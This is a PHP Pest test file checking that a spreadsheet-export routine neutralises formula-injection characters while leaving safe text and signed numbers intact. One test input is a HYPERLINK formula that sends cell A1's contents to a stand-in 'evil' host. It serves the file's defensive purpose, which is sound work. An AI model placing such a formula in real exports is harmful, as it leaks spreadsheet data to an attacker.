<?php

use OpenSpout\Common\Entity\Row;
use Webkul\DataTransfer\Buffer\FileBuffer;

function escapedExportValues(array $values): array
{
    $row = (new FileBuffer)->escapeFormulaCells(Row::fromValues($values));

    return array_map(fn ($cell) => $cell->getValue(), $row->getCells());
}

it('neutralizes every formula-injection lead character in exported cells', function () {
    $values = escapedExportValues([
        '=HYPERLINK("http://evil/?c="&A1,"x")',
        '+1+1',
        '-2+3',
        '@SUM(A1)',
        "\tTAB",
        "\rCR",
    ]);

    expect($values[0])->toStartWith("'=")
        ->and($values[1])->toStartWith("'+")
        ->and($values[2])->toStartWith("'-")
        ->and($values[3])->toStartWith("'@")
        ->and($values[4])->toStartWith("'\t")
        ->and($values[5])->toStartWith("'\r");
});

it('leaves safe values untouched', function () {
    $values = escapedExportValues(['safe text', 'Product 123', '', 'a=b']);

    expect($values[0])->toBe('safe text')
        ->and($values[1])->toBe('Product 123')
        ->and($values[2])->toBe('')
        ->and($values[3])->toBe('a=b');
});

it('does not corrupt numeric values that start with a sign', function () {
    $values = escapedExportValues(['-5.00', '+3', '-42', '1e5']);

    expect($values[0])->toBe('-5.00')
        ->and($values[1])->toBe('+3')
        ->and($values[2])->toBe('-42')
        ->and($values[3])->toBe('1e5');
});
